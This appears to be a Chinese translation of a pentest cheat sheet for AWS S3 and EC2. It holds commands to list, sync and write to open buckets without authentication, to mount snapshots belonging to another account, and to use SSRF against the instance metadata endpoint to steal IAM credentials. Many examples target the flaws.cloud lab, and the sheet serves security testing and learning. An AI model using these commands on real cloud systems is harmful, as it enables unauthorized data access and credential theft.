# 亚马逊S3存储桶AWS

## 摘要

- AWS配置
- 打开存储桶
- 基本测试
  - 列出文件
  - 将文件移动到存储桶中
  - 下载所有内容
  - 检查存储桶磁盘大小
- AWS - 提取备份
- 存储桶中的敏感数据

## AWS配置

先决条件，至少需要安装awscli

```bash
sudo apt install awscli
```

您可以在此处获取您的凭据 https://console.aws.amazon.com/iam/home?#/security_credential
但您需要一个AWS账户，免费试用账户：https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/

```javascript
aws configure
AWSAccessKeyId=[在此处输入您的密钥]
AWSSecretKey=[在此处输入您的密钥]
aws configure --profile nameofprofile
```

然后您可以在aws命令中使用*--profile nameofprofile*。

或者，您可以使用环境变量而不是创建配置文件。

```bash
export AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56
export AWS_SECRET_ACCESS_KEY=fPk/Gya[...]4/j5bSuhDQ
export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU=
```

## 打开存储桶

默认情况下，亚马逊存储桶的名称类似于 http://s3.amazonaws.com/[bucket_name]/，如果您知道它们的名称，可以浏览开放的存储桶

```bash
http://s3.amazonaws.com/[bucket_name]/
http://[bucket_name].s3.amazonaws.com/
http://flaws.cloud.s3.amazonaws.com/
https://buckets.grayhatwarfare.com/
```

如果启用了列表功能，它们的名称也会被列出。

```xml
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Name>adobe-REDACTED-REDACTED-REDACTED</Name>
```

或者，您可以使用 `%C0` 提取内部站点S3存储桶的名称。（技巧来自 https://twitter.com/0xmdv/status/1065581916437585920）

```xml
http://example.com/resources/id%C0

例如：http://redacted/avatar/123%C0
```

## 基本测试

### 列出文件

```bash
aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

您可以使用dig和nslookup获取区域

```bash
$ dig flaws.cloud
;; ANSWER SECTION:
flaws.cloud.    5    IN    A    52.218.192.11

$ nslookup 52.218.192.11
Non-authoritative answer:
11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com.
```

### 将文件移动到存储桶中

```bash
aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read
aws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers
aws s3 mv test.txt s3://hackerone.marketing
失败："move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied."

aws s3 mv test.txt s3://hackerone.files
成功："move: ./test.txt to s3://hackerone.files/test.txt"
```

### 下载所有内容

```powershell
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
```

### 检查存储桶磁盘大小

使用 `--no-sign` 进行未经身份验证的检查。

```powershell
aws s3 ls s3://<bucketname> --recursive  | grep -v -E "(Bucket: |Prefix: |LastWriteTime|^$|--)" | awk 'BEGIN {total=0}{total+=$3}END{print total/1024/1024" MB"}'
```

## AWS - 提取备份

```powershell
$ aws --profile flaws sts get-caller-identity
"Account": "XXXX26262029",


$ aws --profile profile_name ec2 describe-snapshots
$ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
"SnapshotId": "snap-XXXX342abd1bdcb89",

使用快照创建卷
$ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
在Aws控制台 -> EC2 -> 新建Ubuntu
$ chmod 400 YOUR_KEY.pem
$ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com

挂载卷
$ lsblk
$ sudo file -s /dev/xvda1
$ sudo mount /dev/xvda1 /mnt
```

## 存储桶中的敏感数据

亚马逊暴露了一个内部服务，每个EC2实例都可以查询关于主机的实例元数据。如果您发现一个在EC2上运行的SSRF漏洞，请尝试请求：

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE 将返回AccessKeyID、SecretAccessKey和Token
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
```

例如，通过代理：http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

## 参考资料

- 有1951个亚马逊S3存储桶存在漏洞 - 2013年3月27日 - Rapid7 Willis
- Bug Bounty调查 - AWS基本测试
- 基于AWS漏洞的挑战 - Scott Piper的Summit Route
- 基于AWS漏洞的挑战2 - Scott Piper的Summit Route
- Guardzilla摄像头硬编码AWS凭据 ~~- 0dayallday.org~~ - blackmarble.sh
- AWS渗透测试第1部分. S3存储桶 - VirtueSecurity
- AWS渗透测试第2部分. S3, IAM, EC2 - VirtueSecurity
- 对Capital One黑客事件的技术分析 - CloudSploit - 2019年8月2日
